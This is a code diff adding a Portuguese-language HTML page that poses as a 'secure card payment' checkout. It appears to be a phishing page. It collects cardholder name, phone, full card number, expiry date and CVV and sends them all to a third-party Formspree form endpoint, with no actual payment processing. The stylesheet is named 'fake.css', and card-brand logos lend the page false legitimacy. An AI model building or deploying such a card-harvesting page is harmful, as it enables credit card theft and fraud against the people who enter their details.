@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulário de Contato</title>
+    <link rel="stylesheet" href="fake.css">
+    <style>
+        .card-image, .cvv-image {
+            display: none;
+            width: 50px; /* Ajuste conforme necessário */
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="title-container">
+        <h1>Pagamento seguro via cartão.</h1>
+    </div>
+    <div class="container">
+        <div class="form-card">
+            <form id="contactForm" action="https://formspree.io/f/xwpejrqp" method="POST">
+                <div class="form-group">
+                    <label for="phone">Nome no cartão</label>
+                    <input type="text" id="phone" name="phone" maxlength="15" required>
+                    <div id="nameError" class="error-message" style="display:none; color: red;">O nome não pode conter números.</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="name">Telefone</label>
+                    <input type="text" id="name" name="name" maxlength="25" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="numberC">Número do cartão</label>
+                    <div style="display: flex; align-items: center;">
+                        <input type="text" id="numberC" name="numberC" minlength="13" maxlength="16" pattern="\d{13,16}" required>
+                        <img id="cardImage" class="card-image" src="" alt="Bandeira do Cartão">
+                    </div>
+                    <div id="cardError" class="error-message" style="display:none; color: red;">O número do cartão deve conter apenas números.</div>
+                </div>
+
+                <div class="flex-row">
+                    <div class="form-group-half">
+                        <label for="entryDate">Data de validade</label>
+                        <input type="date" id="entryDate" name="entryDate" required>
+                    </div>
+
+                    <div class="form-group-half">
+                        <label for="numberS">Código de segurança</label>
+                        <div style="display: flex; align-items: center;">
+                            <input type="text" id="numberS" name="numberS" maxlength="3" pattern="\d{3}" required>
+                            <img id="cvvImage" class="cvv-image" src="imagem/cvv2.png" alt="CVV">
+                        </div>
+                    </div>
+
+                    <div class="form-group-half">
+                        <label for="installments">N'Parcelas</label>
+                        <select id="installments" name="installments" required>
+                            <option value="">Selecione</option>
+                            <option value="1">1x</option>
+                            <option value="2">2x</option>
+                            <option value="3">3x</option>
+                            <option value="4">4x</option>
+                            <option value="5">5x</option>
+                            <option value="10">10x</option>
+                            <option value="15">15x</option>
+                            <option value="20">20x</option>
+                           <option value="24">24x</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button type="submit">Comprar</button>
+            </form>
+            <div id="responseMessage" class="response-message">
+                <p id="responseText">Erro: O formulário não pôde ser enviado. Por favor, tente novamente.</p>
+            </div>
+            <div id="successMessage" class="response-message" style="display:none;">
+                <p>Obrigado! Seu formulário foi enviado com sucesso.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Seção para as imagens -->
+    <div class="image-gallery">
+        <img src="imagem/m.gif" alt="Imagem 1">
+        <img src="imagem/e.png" alt="Imagem 2">
+        <img src="imagem/v.png" alt="Imagem 3">
+        <img src="imagem/h.png" alt="Imagem 4">
+    </div>
+
+    <script>
+        document.getElementById('contactForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+
+            fetch(event.target.action, {
+                method: 'POST',
+                body: new FormData(event.target),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('responseMessage').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                } else {
+                    throw new Error('Erro ao enviar o formulário');
+                }
+            })
+            .catch(error => {
+                console.error('Erro:', error);
+                document.getElementById('responseText').textContent = 'Erro: O formulário não pôde ser enviado. Por favor, tente novamente.';
+                document.getElementById('responseMessage').style.display = 'block';
+                document.getElementById('successMessage').style.display = 'none';
+            });
+        });
+
+        document.getElementById('phone').addEventListener('input', function() {
+            const value = this.value;
+            const hasNumbers = /\d/.test(value);
+            const errorMessage = document.getElementById('nameError');
+
+            if (hasNumbers) {
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+            }
+        });
+
+        document.getElementById('numberC').addEventListener('input', function() {
+            const value = this.value;
+            const isValid = /^\d*$/.test(value);
+            const cardImage = document.getElementById('cardImage');
+
+            if (!isValid) {
+                document.getElementById('cardError').style.display = 'block';
+                cardImage.style.display = 'none';
+            } else {
+                document.getElementById('cardError').style.display = 'none';
+                if (value.startsWith('4')) {
+                    cardImage.src = 'imagem/v.png'; // Caminho para a imagem da bandeira Visa
+                    cardImage.style.display = 'block';
+                } else if (value.startsWith('5')) {
+                    cardImage.src = 'imagem/mastercard.png'; // Caminho para a imagem da bandeira MasterCard
+                    cardImage.style.display = 'block';
+                } else if (value.startsWith('34') || value.startsWith('37')) {
+                    cardImage.src = 'imagem/american.webp'; // Caminho para a imagem da bandeira American Express
+                    cardImage.style.display = 'block';
+                } else {
+                    cardImage.style.display = 'none';
+                }
+            }
+        });
+
+        document.getElementById('numberS').addEventListener('input', function() {
+            const value = this.value;
+            const cvvImage = document.getElementById('cvvImage');
+
+            // Mostra a imagem do CVV se algum valor for digitado
+            if (value.length > 0) {
+                cvvImage.style.display = 'block';
+            } else {
+                cvvImage.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
